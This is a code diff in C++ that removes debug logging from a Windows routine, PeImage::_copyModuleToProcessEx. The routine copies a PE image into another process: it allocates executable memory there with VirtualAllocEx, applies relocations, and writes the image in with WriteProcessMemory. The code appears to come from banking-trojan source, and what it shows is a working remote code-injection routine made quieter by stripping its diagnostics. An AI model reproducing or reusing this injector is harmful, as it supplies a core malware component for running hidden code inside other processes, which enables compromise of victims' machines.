@@ -7,7 +7,6 @@
 #include "peimage.h"
 #include "mem.h"
 #include "str.h"
-#include "debug.h"
 
 //Retrieve of NT-headers.
 #define IMAGE_GET_NT_HEADERS(image) ((void *)((IMAGE_NT_HEADERS32 *)((LPBYTE)(image) + ((IMAGE_DOS_HEADER *)(image))->e_lfanew)))
@@ -810,47 +809,28 @@ void *PeImage::_copyModuleToProcessEx(HANDLE process, void *image, IMAGE_DATA_DI
 #endif
   
   DWORD imageSize = ntHeader->OptionalHeader.SizeOfImage;
-	WDEBUG3(WDDT_INFO, "Image size=%x, imageBasePtr=%x, ntHeaderImageBase=%x",imageSize,(LPBYTE)image,(LPBYTE)ntHeader->OptionalHeader.ImageBase);
   bool ok         = false;
 
   if(CWA(kernel32, IsBadReadPtr)(image, imageSize) != 0)
 	{
-		WDEBUG0(WDDT_ERROR, "IsBadReadPtr failed");
 		return NULL;
 	}
   //Allocate memory for the module.
   LPBYTE remoteMem = (LPBYTE)CWA(kernel32,VirtualAllocEx)(process, NULL, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   if(remoteMem != NULL)
   {
-		{
-			WDEBUG1(WDDT_INFO, "OK: allocate memory for the module: remoteMemPtr=0x%x",(LPBYTE)remoteMem);
-		}
     //Create a local buffer, in which will make changes.
     LPBYTE buf = (LPBYTE)Mem::copyEx(image, imageSize);
     if(buf != NULL)
     {
-			{
-				WDEBUG1(WDDT_INFO, "OK: allocate memory for local buffer: buf=0x%x",(LPBYTE)buf);
-			}
-      
 			//Apply relocations.
       if(relocsDir->Size > 0 && relocsDir->VirtualAddress > 0)
       {
-				{
-					WDEBUG0(WDDT_INFO, "OK: Base relocations are present.");
-				}
         DWORD_PTR delta										= (DWORD_PTR)((LPBYTE)remoteMem - ntHeader->OptionalHeader.ImageBase);
         DWORD_PTR oldDelta								= (DWORD_PTR)((LPBYTE)image - ntHeader->OptionalHeader.ImageBase);
 
-				{
-					WDEBUG2(WDDT_INFO, "Relocation info: delta=0x%x, oldDelta=0x%x.",(LPBYTE)delta,(LPBYTE)oldDelta);
-				}
-
         while(relHdrSrc->VirtualAddress != 0)
         {
-					{
-						WDEBUG2(WDDT_INFO, "Current relocation relHdrSrc.VirtualAddressPtr=0x%x, relHdrSrc*=0x%x",(LPBYTE)relHdrSrc->VirtualAddress,(LPBYTE)relHdrSrc);
-					}
           if(relHdrSrc->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
           {
             DWORD relCount = (relHdrSrc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
@@ -867,29 +847,13 @@ void *PeImage::_copyModuleToProcessEx(HANDLE process, void *image, IMAGE_DATA_DI
           }
           
           relHdrSrc = (IMAGE_BASE_RELOCATION *)((LPBYTE)relHdrSrc + relHdrSrc->SizeOfBlock);
-					{
-						WDEBUG1(WDDT_INFO, "Next relocation header ptr=0x%x",(LPBYTE)relHdrSrc);
-					}
-
 				}
 
       }
-			else
-				WDEBUG2(WDDT_ERROR, "BaseRelocation: relocsDir->Size=%u, relocsDir->VirtualAddress=%x",relocsDir->Size,(LPVOID)relocsDir->VirtualAddress);
-
-			{
-				WDEBUG0(WDDT_INFO, "About to write local buffer (buf) to remoteMem");
-			}
 			ok = CWA(kernel32,WriteProcessMemory)(process, remoteMem, buf, imageSize, NULL) ? true : false;
-			if(!ok)
-			{
-				WDEBUG0(WDDT_ERROR, "Local buffer (buf) can't be written to remoteMem");
-			}
 
       Mem::free(buf);
     }
-		else
-			WDEBUG0(WDDT_ERROR, "Allocate local buffer failed");
 
     if(!ok)
     {
@@ -897,8 +861,6 @@ void *PeImage::_copyModuleToProcessEx(HANDLE process, void *image, IMAGE_DATA_DI
       remoteMem = NULL;
     }
   }
-	else
-		WDEBUG0(WDDT_ERROR, "Allocate remoteMem failed");
 
   return remoteMem;
 }
